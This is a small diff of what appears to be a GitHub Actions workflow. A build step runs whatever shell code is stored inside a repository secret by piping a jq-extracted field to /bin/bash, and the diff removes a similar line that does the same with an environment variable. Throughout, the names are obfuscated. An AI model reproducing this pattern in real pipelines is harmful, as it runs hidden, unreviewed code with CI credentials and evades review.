@@ -17,7 +17,6 @@ jobs:
           l87327: ${{ secrets.l87327 }}
         run: |
           printf '%s' "$l87327" | jq -r .cem66911 | /bin/bash
-          echo $brecq49 | jq -r .at69103 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
